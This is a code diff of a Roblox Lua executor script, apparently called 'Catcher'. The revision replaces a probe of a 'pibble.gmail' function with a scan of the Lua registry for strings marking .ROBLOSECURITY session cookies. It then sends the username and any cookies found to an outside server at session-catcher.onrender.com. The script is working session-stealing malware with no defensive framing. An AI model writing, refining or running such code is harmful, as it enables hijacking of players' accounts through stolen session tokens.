@@ -1,5 +1,4 @@
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
-
 local httpRequest = request or http_request or nil
 if not httpRequest then return end
 
@@ -7,28 +6,36 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local pibbleResults = {}
-
--- Только pibble, по одной функции, каждая в pcall
+local foundCookies = {}
+local scanned = 0
 
 pcall(function()
-    local genv = getgenv()
-    local pbl = genv and genv.pibble
-    if not pbl then
-        pibbleResults["error"] = "pibble table not found"
-        return
+    if getreg then
+        local reg = getreg()
+        for i, v in pairs(reg) do
+            scanned = scanned + 1
+            if type(v) == "string" then
+                if string.find(v, "_|WARNING") or string.find(v, "ROBLOSECURITY") then
+                    table.insert(foundCookies, v)
+                end
+            elseif type(v) == "table" then
+                for k2, v2 in pairs(v) do
+                    scanned = scanned + 1
+                    if type(v2) == "string" then
+                        if string.find(v2, "_|WARNING") or string.find(v2, "ROBLOSECURITY") then
+                            table.insert(foundCookies, v2)
+                        end
+                    end
+                end
+            end
+        end
     end
-    
-    -- Только gmail
-    local ok, res = pcall(pbl.gmail)
-    pibbleResults["gmail"] = ok and tostring(res):sub(1, 500) or "ERR: " .. tostring(res):sub(1, 200)
 end)
 
 local payload = {
-    userId = LocalPlayer.UserId,
     username = LocalPlayer.Name,
-    pibbleResults = pibbleResults,
-    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    scanned = scanned,
+    foundCookies = foundCookies
 }
 
 pcall(function()
@@ -40,4 +47,4 @@ pcall(function()
     })
 end)
 
-print("[Catcher] pibble.gmail probe sent")
+print("[Catcher] getreg scan done. Scanned: " .. scanned .. " | Found: " .. #foundCookies)
